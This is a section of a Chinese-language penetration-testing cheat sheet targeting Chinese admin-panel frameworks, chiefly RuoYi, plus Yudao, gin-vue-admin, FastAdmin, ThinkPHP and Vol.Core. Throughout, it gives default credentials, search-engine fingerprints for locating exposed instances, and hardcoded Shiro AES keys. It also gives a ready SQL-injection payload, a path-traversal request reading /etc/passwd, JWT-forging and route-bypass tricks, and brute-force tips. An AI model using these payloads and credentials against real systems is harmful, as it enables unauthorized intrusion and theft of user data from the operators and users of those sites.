## 4. 国内后台框架专项(默认值 = 第一顺位)

### 若依 RuoYi / RuoYi-Vue / Cloud
```
弱口令: 用户 admin | ruoyi | druid   密码 123456 | admin | admin123 | admin888
指纹:   FOFA icon_hash="-1231872293" || icon_hash="706913071"
        Hunter web.body="若依后台管理系统"
未授权: /prod-api/system/user/list  (直接吐用户表含 hash)
Shiro rememberMe 默认 AES 密钥(版本对应):
  RuoYi 4.6.1–4.3.1  → zSyK5Kp6PZAAjlT+eeNMlg==
  RuoYi 3.4 及以下    → fCq+/xW488hMTCD+cmJ3aQ==
  ≥4.6.2 起改为随机密钥,拿不到密钥就无法利用
注入:   /role/list  <V4.6.2   &params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
        /dept/edit  <V4.6.2
任意文件下载: /common/download/resource?resource=/profile/../../../../etc/passwd   (RuoYi<4.5.1)
定时任务 RCE: 后台 job 管理 + 权限绕过 + 配置路径篡改(≤4.7.6 组合洞)
```
### 芋道 Yudao / GVA / Vben / Vol.Core / FastAdmin / ThinkPHP
- **芋道**: `admin/admin123`;Mock 关闭时字典可读超管 profile;`tenant-id` 头
- **GVA(gin-vue-admin)**: `admin/123456`;`/api/base/login`;注册接口→提 `authorityId`→伪造 JWT;
  CVE-2024-31457 任意代码覆盖;CVE-2026-48787(2.9.1)代码生成器方向
- **FastAdmin**: `admin/123456`;**AJ-Captcha 滑块 + 图形验证码双验证**,先破验证码再谈口令;
  `/adminlogin/ajax/lang?callback=define&controllername=index&lang=zh-cn` 泄露全部 UI 文案与错误语义;
  失败锁定语言包 `please try again after 1 day` = 锁 1 天,**爆破前先测是否已锁**
- **ThinkPHP 3/5**: 老站 `class X extends Action`(而非 `CommonAction`)= **整块无鉴权**,
  审计/黑盒都优先 grep 这个;`/index.php?s=/admin/...` 兼容路由常能绕目录级 403;
  `DEFAULT_FILTER=htmlspecialchars` 会打死字符串拼接注入,别反复换注释符
- **Vol.Core/Vue.NetCore**: JWT 弱密钥 + 表驱动 API(`{m}/{c}/{a}`)

---

